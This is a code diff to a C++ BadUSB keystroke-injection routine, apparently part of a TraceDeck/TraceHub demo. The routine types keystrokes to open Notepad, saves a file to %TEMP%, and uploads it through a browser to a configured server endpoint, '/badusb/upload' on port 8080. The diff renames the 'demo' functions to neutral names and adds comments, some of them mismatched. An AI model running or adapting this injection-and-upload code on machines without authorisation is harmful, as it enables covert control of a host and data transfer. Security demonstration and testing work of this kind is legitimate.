@@ -1,23 +1,28 @@
 #include "DropUpload.h"
-
 #include <Keyboard.h>
 
 #define TRACEDECK_STRINGIFY_LITERAL(value) #value
 #define TRACEDECK_STRINGIFY(value) TRACEDECK_STRINGIFY_LITERAL(value)
 
-namespace
-{
+namespace{
+    // Delay for the Save As dialog to appear after pressing Ctrl+S in Notepad
     constexpr uint32_t kDialogWaitMs = 1750;
+    // Delay for Notepad to launch after pressing Win+R and typing "notepad.exe"
     constexpr uint32_t kNotepadLaunchWaitMs = 2500;
+    // Delay for the Save As dialog to appear after pressing Ctrl+S in Notepad
     constexpr uint32_t kNotepadSaveWaitMs = 2500;
+    // Delay for the browser to launch after pressing Win+R and typing the upload URL
     constexpr uint32_t kBrowserLaunchWaitMs = 2500;
+    // Delay for the Save As dialog to appear after pressing Ctrl+S in the browser
     constexpr uint32_t kNotepadTotalWaitMs = kNotepadLaunchWaitMs + 4 * kDialogWaitMs;
+    // Delay for the Save As dialog to appear after pressing Ctrl+S in the browser
     constexpr uint32_t kUploadTotalWaitMs = kNotepadSaveWaitMs + kBrowserLaunchWaitMs + 3 * kDialogWaitMs;
+    // Refresh the progress bar every 125ms, which is a good balance between responsiveness and not overwhelming the host with USB traffic.
     constexpr uint32_t kProgressRefreshMs = 125;
 
-#ifdef TRACEHUB_PC1_IP
+#ifdef TRACEHUB_SERVER_IP
     constexpr char kTraceHubUploadUrl[] =
-        "http://" TRACEDECK_STRINGIFY(TRACEHUB_PC1_IP) ":8080/badusb/upload";
+        "http://" TRACEDECK_STRINGIFY(TRACEHUB_SERVER_IP) ":8080/badusb/upload";
 #else
     constexpr char kTraceHubUploadUrl[] = "";
 #endif
@@ -62,7 +67,7 @@ namespace
         Keyboard.write(KEY_RETURN);
     }
 
-    void enterDemoFilePath(TimedProgress &timing)
+    void enterFilePathInDialog(TimedProgress &timing)
     {
         pressShortcut(KEY_LEFT_ALT, 'd');
         Keyboard.print("%TEMP%");
@@ -87,11 +92,11 @@ namespace
         pressShortcut(KEY_LEFT_CTRL, 's');
         timing.wait(kDialogWaitMs);
 
-        enterDemoFilePath(timing);
+        enterFilePathInDialog(timing);
     }
 }
 
-void sendBadUsbDemoKeys(const BadUsbProgress &progress)
+void sendDropUploadKeys(const BadUsbProgress &progress)
 {
     const bool uploadEnabled = kTraceHubUploadUrl[0] != '\0';
     TimedProgress timing{progress, kNotepadTotalWaitMs + (uploadEnabled ? kUploadTotalWaitMs : 0), 0};
@@ -114,5 +119,5 @@ void sendBadUsbDemoKeys(const BadUsbProgress &progress)
     timing.wait(kBrowserLaunchWaitMs);
     Keyboard.write(KEY_RETURN);
     timing.wait(kDialogWaitMs);
-    enterDemoFilePath(timing);
+    enterFilePathInDialog(timing);
 }
